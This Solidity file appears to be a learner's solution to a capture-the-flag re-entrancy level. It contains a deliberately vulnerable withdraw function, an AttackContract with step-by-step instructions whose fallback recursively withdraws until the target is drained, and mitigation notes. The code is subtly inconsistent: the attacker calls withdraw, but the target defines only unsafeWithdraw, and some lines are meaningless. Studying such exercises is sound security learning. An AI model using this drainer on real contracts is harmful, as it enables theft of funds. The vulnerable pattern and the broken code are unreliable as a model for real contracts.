pragma solidity ^0.6.0;

// Solution to reentrancy can be found in the screenshot.
/*
1. reentrancy guard: https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard
2. doing pull payments instead of push payments: https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment
This is considered payment best practise in solidity.
3. Use the Checks-Effects-Interactions Pattern

*/

/* 
Re-entrancy
Level completed!
Difficulty 6/10

The goal of this level is for you to steal all the funds from the contract.

  Things that might help:

Untrusted contracts can execute code where you least expect it.
Fallback methods
Throw/revert bubbling
Sometimes the best way to attack a contract is with another contract.
See the Help page above, section "Beyond the console"
In order to prevent re-entrancy attacks when moving funds out of your contract, use the Checks-Effects-Interactions pattern being aware that call will only return false without interrupting the execution flow. Solutions such as ReentrancyGuard or PullPayment can also be used.

transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork Source 1 Source 2.

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

 

The DAO Hack
The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack.


 */


// SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;

// import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }
  function unsafeWithdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
    
    // There are 3 ways of moving money in solidity, `.send`, `.transfer` and `.call`.
    // msg.sender isn't just a user wallet, it can also be a smart contract.
    // if msg.sender is a contract, bcos we are not specifying the function name(i.e msg.sender.functionName.call)
    // in msg.sender.call, it will call the fallback function in the contract.
    // this function( unnamed in old solidity but called receive() in newer version) is able to receive money.
    // it is common to have this fallback function(e.g receive) in smart contract except u have a specific function called deposit or something.
    // Hence, this wil call the fallback function of whomever is executing the transaction here(which can also be a smart contract).
    // which can call another function in another smart contract.
    // This calls the fallback function in attack contract which in turn calls this withdraw function 
    // which makes it recursive. So, we never get passed to even decrement the user balance which means the 
    // check up there will continue passing until this contract is fully drained
      (bool result,) = msg.sender.call.value(_amount)("");
      if(result) {
        _amount;
      }
      
       // if successfully sent, this will be decremented.
       // Bcos this is not up before sending the transaction, this internal mechanism gets totally ignored
       // when this function is called recursively, this isn't decremented, enabling the user to continue sending to
       // the smart contract.
       // This function is recursively called into it before the function has fully executed the previous one.
       // So, money can get sent to the other account over and over again, because user does not even get decremented.
       // The solution would be to move this state change upward before sending to user.
      balances[msg.sender] -= _amount;
    }
  }

   receive() external payable {}
}

/*
interface Reentrance {
    function withdraw(uint _amount) external;
}
*/


// Solution steps to carry out the reentrancy attack.
// 1. Deploy the AttackContract with about 1 eth as the payable value
// 2. Call the `donateToTarget` method which donates from the contract to the target contract.
// 3. Call the `transact` low level interactions function which in turn calls the fallback function. 
// This is called `Transact` button in remix.ide(as at auguest, 2021) and can be found
// at the bottom of a deployed contract under low level interactions

// It's important to understand reentrancy because this can cause an attacker to
// drain your contract. It occurs when u write a function that makes an external call to an untrusted contract.
//  before ur function call is able to finish executing and resolve any king of effect and bcos ure potentially calling anothe rcontract that is untrusted, they can take 
// control of ur calling function in ur contract and make a recursive that create a loop with very unfortunate
// uninted consequences
contract AttackContract {
    Reentrance public addressToHack;
    address public sender;
    uint public amount = 1 ether;  // withrawal amount each time.
    
    constructor(address payable _addressToHack) public payable{
        // without new, the constructor creates a pointer to the ethereum address of Reentrance smart contract.
    addressToHack = Reentrance(_addressToHack);    
    }
    
   /*
    // Not used: keeping for reference purpose
   function attackVulnerableDOWWallet() public payable{
        require(msg.value >= 1 ether);
        sender = msg.sender;
        addressToHack.donate{value: msg.sender}();
        addressToHack.withdraw(1 ether);
    }*/
    
    
    // 1. This should first be called after deployin gthis contract.
    // This can be confirmed by checking this contract's address on balanceOf function
    // of the target contract. which should now have this contract address in it with its donation.

    function donateToTarget() public {
        addressToHack.donate.value(amount).gas(600000)(address(this)); // Need to add value to this function
    }

    
    // Click on or call the `transact` low level interactions which in turn calls this fallback function
    // This is called Transact button in remix.ide and can be found at the buttom of a deployed contract in the IDE.
    
    fallback() external payable {
        // prevent the recursice function from running eternally
        if(address(addressToHack).balance != 0){
            addressToHack.withdraw(amount);
        }
    }
    
       /*receive() external payable {
        // prevent the recursice function from running eternally
        if(address(addressToHack).balance >= 0 ether){
            addressToHack.withdraw(1 ether);
        }
    }*/
    
    
     function getHackedContractBalance() public view returns(uint) {
        return address(addressToHack).balance;
    }
    
    function getContractBalance() public view returns(uint) {
        return address(this).balance;
    }
    
}





/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }


    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }


}
